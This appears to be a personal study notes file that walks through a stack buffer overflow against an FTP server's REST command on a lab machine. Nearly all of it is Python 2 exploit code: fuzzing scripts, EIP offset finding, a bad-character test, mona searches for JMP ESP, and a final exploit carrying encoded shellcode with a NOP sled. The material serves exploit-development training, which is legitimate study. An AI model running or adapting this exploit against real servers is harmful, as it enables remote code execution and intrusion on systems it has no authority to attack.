## Buffer Overflow

### Crashing the application

```python
import errno
from os import strerror
from socket import *
import sys
from time import sleep
from struct import pack

size = 100 #defining an initial buffer size
ip = "192.168.36.159"
port = 21
while(size < 500): #using a while loop to keep sending the buffer until it reaches 500 bytes
    try:
        print "\nSending evil buffer with %s bytes" % size
    	buffer ="A" * size #defining the buffer as a bunch of As
    	s = socket(AF_INET,SOCK_STREAM)
    	s.connect((ip,port)) #establishing connection
    	s.recv(2000)
    	s.send("USER test\r\n") #sending username
    	s.recv(2000)
    	s.send("PASS test\r\n") #sending password
    	s.recv(2000)
    	s.send("REST "+ buffer +"\r\n") #sending rest and buffer
    	s.close() #closing the connection
    	s = socket(AF_INET,SOCK_STREAM)
    	s.connect((ip,port)) #an additional connection is needed for the crash to occur
    	sleep(1) #waiting one second
    	s.close() #closing the connection

        size +=100 #increasing the buffer size by 100
        sleep(10) #waiting 10 seconds before repeating the loop

    except: #if a connection can't be made, print an error and exit cleanly
    	print "[*]Error in connection with server"
    	sys.exit()
```

### Identifying the EIP offset
```bash
msf-pattern_create -l [pattern length]
#msf-pattern_create -l 300
#Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
```
Then include pattern to script
```python
import errno
from os import strerror
from socket import *
import sys
from time import sleep
from struct import pack

ip = "192.168.36.159"
port = 21

try:
	print "\n[+] Sending evil buffer..."
	buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9" #defining the buffer as a random pattern
	s = socket(AF_INET,SOCK_STREAM)
	s.connect((ip,port)) #establishing connection
	s.recv(2000)
	s.send("USER test\r\n") #sending username
	s.recv(2000)
	s.send("PASS test\r\n") #sending password
	s.recv(2000)
	s.send("REST "+ buffer +"\r\n") #sending rest and buffer
	s.close()
	s = socket(AF_INET,SOCK_STREAM)
	s.connect((ip,port)) #an additional connection is needed for the crash to occur
	sleep(1) #waiting one second
	s.close() #closing the connection
	print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
	print "\n[+] Sending buffer: " + buffer
	print "\n[+] Done!"

except: #if a connection can't be made, print an error and exit cleanly
	print "[*]Error in connection with server"
	sys.exit()
```
```bash
#example
python bof2.py

EIP = 41326941
```
Finding pattern offset
```bash
msf-pattern_offset -l [pattern length] -q [EIP address]
#msf-pattern_offset -l 300 -q 41326941                                               
#Exact match at offset 246

!mona findmsp -distance 400
```

Modifying the script to override EIP with four “B” characters instead of the As in order to verify whether the last test was successful:

```python
import errno
from os import strerror
from socket import *
import sys
from time import sleep
from struct import pack

ip = "192.168.36.159"
port = 21

try:
	print "\n[+] Sending evil buffer..."
	offset = "A" * 246 #defining the offset value
        EIP = "B" * 4 #EIP placeholder
        padding = "C" * (300 - len(offset) - len(EIP)) #adding padding to keep the same buffer size of 300 bytes
        buffer = offset + EIP + padding #assembling the buffer
        s = socket(AF_INET,SOCK_STREAM)
	s.connect((ip,port)) #establishing connection
	s.recv(2000)
	s.send("USER test\r\n") #sending username
	s.recv(2000)
	s.send("PASS test\r\n") #sending password
	s.recv(2000)
	s.send("REST "+ buffer +"\r\n") #sending rest and buffer
	s.close()
	s = socket(AF_INET,SOCK_STREAM)
	s.connect((ip,port)) #an additional connection is needed for the crash to occur
	sleep(1) #waiting one second
	s.close() #closing the connection
	print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
	print "\n[+] Sending buffer: " + buffer
	print "\n[+] Done!"

except: #if a connection can't be made, print an error and exit cleanly
	print "[*]Error in connection with server"
	sys.exit()
```
```bash
#example
python bof3.py

EIP = 42424242
```

### Finding Available Shellcode Space

```python
import errno
from os import strerror
from socket import *
import sys
from time import sleep
from struct import pack

ip = "192.168.36.159"
port = 21

try:
	print "\n[+] Sending evil buffer..."
	offset = "A" * 246 #defining the offset value
        EIP = "B" * 4 #EIP placeholder
        shellcode = "C" * (800 - (len(offset) -len(EIP))) #Shellcode placeholder using about 550 Cs
        buffer = offset + EIP + shellcode #assembling the buffer 
        s = socket(AF_INET,SOCK_STREAM)
	s.connect((ip,port)) #establishing connection
	s.recv(2000)
	s.send("USER test\r\n") #sending username
	s.recv(2000)
	s.send("PASS test\r\n") #sending password
	s.recv(2000)
	s.send("REST "+ buffer +"\r\n") #sending rest and buffer
	s.close()
	s = socket(AF_INET,SOCK_STREAM)
	s.connect((ip,port)) #an additional connection is needed for the crash to occur
	sleep(1) #waiting one second
	s.close() #closing the connection
	print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
	print "\n[+] Sending buffer: " + buffer
	print "\n[+] Done!"

except: #if a connection can't be made, print an error and exit cleanly
	print "[*]Error in connection with server"
	sys.exit()
```
```python
End of C - ESP

#example
0x0289fda8 - 0x0289fbe8
448
```
### Testing for Bad Characters
```python
import errno
from os import strerror
from socket import *
import sys
from time import sleep
from struct import pack

ip = "192.168.36.159"
port = 21

try:
	print "\n[+] Sending evil buffer..."
	offset = "A" * 246 #defining the offset value
        EIP = "B" * 4 #EIP placeholder
        badchars = (
	"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
	"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
	"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
	"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
	"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
	"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
	"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
	"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
	"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
	"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
	"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
	"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
	"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
	"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
	"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
	"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" ) #adding all possible characters

	buffer = offset + EIP + badchars #assembling the buffer
        s = socket(AF_INET,SOCK_STREAM)
	s.connect((ip,port)) #establishing connection
	s.recv(2000)
	s.send("USER test\r\n") #sending username
	s.recv(2000)
	s.send("PASS test\r\n") #sending password
	s.recv(2000)
	s.send("REST "+ buffer +"\r\n") #sending rest and buffer
	s.close()
	s = socket(AF_INET,SOCK_STREAM)
	s.connect((ip,port)) #an additional connection is needed for the crash to occur
	sleep(1) #waiting one second
	s.close() #closing the connection
	print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
	print "\n[+] Sending buffer: " + buffer
	print "\n[+] Done!"

except: #if a connection can't be made, print an error and exit cleanly
	print "[*]Error in connection with server"
	sys.exit()
```
### Finding a JMP ESP return address

- Using !mona modules
- Finding a valid opcode for the JMP ESP instruction
```bash
msf-nasm_shell                       
nasm > jmp esp
00000000  FFE4              jmp esp
-------------------------------------------------------------------------------
!mona find -s string_to_search_for -m module_to_search_in
!mona find -s "\xff\xe4" -m "ntdll.dll"
0x7723cda3
```
```python
import errno
from os import strerror
from socket import *
import sys
from time import sleep
from struct import pack

ip = "192.168.156.146"
port = 21

try:
	print "\n[+] Sending evil buffer..."
	offset = "A" * 246 #defining the offset value
        EIP = "\x53\x0a\x77\x77" #EIP placeholder 
        shellcode = "C" * (700 - (len(offset) -len(EIP))) #Shellcode placeholder using about 550 Cs
        buffer = offset + EIP + shellcode #assembling the buffer
        s = socket(AF_INET,SOCK_STREAM)
	s.connect((ip,port)) #establishing connection
	s.recv(2000)
	s.send("USER test\r\n") #sending username
	s.recv(2000)
	s.send("PASS test\r\n") #sending password
	s.recv(2000)
	s.send("REST "+ buffer +"\r\n") #sending rest and buffer
	s.close()
	s = socket(AF_INET,SOCK_STREAM)
	s.connect((ip,port)) #an additional connection is needed for the crash to occur
	sleep(1) #waiting one second
	s.close() #closing the connection
	print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
	print "\n[+] Sending buffer: " + buffer
	print "\n[+] Done!"

except: #if a connection can't be made, print an error and exit cleanly
	print "[*]Error in connection with server"
	sys.exit()
```

```python
import errno
from os import strerror
from socket import *
import sys
from time import sleep
from struct import pack

ip = "192.168.156.146"
port = 21

try:
	print "\n[+] Sending evil buffer..."
	offset = "A" * 246 #defining the offset value
        EIP = "\xDB\x09\x49\x77" #EIP Return Address
        shellcode =  b""
        shellcode += b"\xda\xd0\xb8\x15\x13\xc4\x6c\xd9\x74\x24\xf4"
        shellcode += b"\x5e\x33\xc9\xb1\x59\x31\x46\x19\x03\x46\x19"
        shellcode += b"\x83\xc6\x04\xf7\xe6\x38\x84\x78\x08\xc1\x55"
        shellcode += b"\xe6\x80\x24\x64\x34\xf6\x2d\xd5\x88\x7c\x63"
        shellcode += b"\xd6\x63\xd0\x90\xe9\xc4\x9f\xbe\x7e\x58\x08"
        shellcode += b"\x8e\x7f\xad\x88\x5c\x43\xac\x74\x9f\x90\x0e"
        shellcode += b"\x44\x50\xe5\x4f\x81\x26\x83\xa0\x5f\x32\x39"
        shellcode += b"\x2e\x37\xcf\xfc\x72\xb6\x1f\x8b\xca\xc0\x1a"
        shellcode += b"\x4c\xbe\x7c\x24\x9d\xb5\x25\x06\x96\x81\xcd"
        shellcode += b"\x16\xa9\xc2\x6b\x5f\xdd\xd8\x3a\xeb\x2a\xab"
        shellcode += b"\xbc\x3d\x63\x54\x8f\x01\x28\x6b\x3f\x8c\x30"
        shellcode += b"\xac\xf8\x6f\x47\xc6\xfa\x12\x50\x1d\x80\xc8"
        shellcode += b"\xd5\x81\x22\x9a\x4e\x65\xd2\x4f\x08\xee\xd8"
        shellcode += b"\x24\x5e\xa8\xfc\xbb\xb3\xc3\xf9\x30\x32\x03"
        shellcode += b"\x88\x03\x11\x87\xd0\xd0\x38\x9e\xbc\xb7\x45"
        shellcode += b"\xc0\x19\x67\xe0\x8b\x88\x7e\x94\x74\x53\x7f"
        shellcode += b"\xc8\xe2\x9f\xb2\xf3\xf2\xb7\xc5\x80\xc0\x18"
        shellcode += b"\x7e\x0f\x68\xd0\x58\xc8\xf9\xf6\x5a\x06\x41"
        shellcode += b"\x96\xa4\xa7\xb1\xbe\x62\xf3\xe1\xa8\x43\x7c"
        shellcode += b"\x6a\x29\x6b\xa9\x06\x23\xfb\x92\x7e\xaf\x6a"
        shellcode += b"\x7a\x7c\xd0\x8d\xc0\x09\x36\xdd\x66\x59\xe7"
        shellcode += b"\x9e\xd6\x19\x57\x77\x3d\x96\x88\x67\x3e\x7d"
        shellcode += b"\xa1\x02\xd1\x2b\x99\xba\x48\x76\x51\x5a\x94"
        shellcode += b"\xad\x1f\x5c\x1e\x47\xdf\x13\xd7\x22\xf3\x44"
        shellcode += b"\x80\xcc\x0b\x95\x25\xcc\x61\x91\xef\x9b\x1d"
        shellcode += b"\x9b\xd6\xeb\x81\x64\x3d\x68\xc5\x9b\xc0\x58"
        shellcode += b"\xbd\xaa\x56\xe4\xa9\xd2\xb6\xe4\x29\x85\xdc"
        shellcode += b"\xe4\x41\x71\x85\xb7\x74\x7e\x10\xa4\x24\xeb"
        shellcode += b"\x9b\x9c\x99\xbc\xf3\x22\xc7\x8b\x5b\xdd\x22"
        shellcode += b"\x88\x9c\x21\xb0\xa7\x04\x49\x4a\xf8\xb4\x89"
        shellcode += b"\x20\xf8\xe4\xe1\xbf\xd7\x0b\xc1\x40\xf2\x43"
        shellcode += b"\x49\xca\x93\x26\xe8\xcb\xb9\xe7\xb4\xcc\x4e"
        shellcode += b"\x3c\x47\xb6\x3f\xc3\xa8\x47\x56\xa0\xa9\x47"
        shellcode += b"\x56\xd6\x96\x91\x6f\xac\xd9\x21\xd4\xbf\x6c"
        shellcode += b"\x07\x7d\x2a\x8e\x1b\x7d\x7f"
        nops = "\x90" * 20 #NOP Slides
        buffer = offset + EIP + nops + shellcode
        s = socket(AF_INET,SOCK_STREAM)
	s.connect((ip,port)) #establishing connection
	s.recv(2000)
	s.send("USER test\r\n") #sending username
	s.recv(2000)
	s.send("PASS test\r\n") #sending password
	s.recv(2000)
	s.send("REST "+ buffer +"\r\n") #sending rest and buffer
	s.close()
	s = socket(AF_INET,SOCK_STREAM)
	s.connect((ip,port)) #an additional connection is needed for the crash to occur
	sleep(1) #waiting one second
	s.close() #closing the connection
	print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
	print "\n[+] Sending buffer: " + buffer
	print "\n[+] Done!"

except: #if a connection can't be made, print an error and exit cleanly
	print "[*]Error in connection with server"
	sys.exit()
```